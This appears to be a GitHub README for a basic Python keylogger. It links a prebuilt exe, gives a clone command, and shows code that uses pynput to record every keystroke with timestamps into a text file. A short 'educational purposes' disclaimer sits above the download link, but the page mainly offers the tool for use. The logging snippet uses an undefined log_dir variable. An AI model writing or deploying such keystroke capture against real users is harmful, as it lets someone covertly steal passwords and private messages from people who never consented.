### keylogger
A simple keylogger made with python.It stores the letters in the text file.
### Disclaimer
Don't use this for bad purposes.Don't hack anyone this is just for educational purposes.
### Download the exe 
[Download](https://github.com/shourgamer2/keylogger/releases/download/version1.0.0/keylogger.exe) <br>
It saves the letters in text file.
### Fork this repo
```sh
git clone https://github.com/shourgamer2/keylogger
```
### Modify the code 
You need python installed in your system to modify the code
Import the needed things 
``` python
from pynput.keyboard import Key, Listener
import logging
```
Logging 
``` python 
logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')
```
Making the logger 
``` python
def on_press(key):
    logging.info(str(key))
    
with Listener(on_press=on_press) as listener:
    listener.join() 
   ```
### How does it work 
   It logs all the things you type in your keyboard and stores it in a text file
   
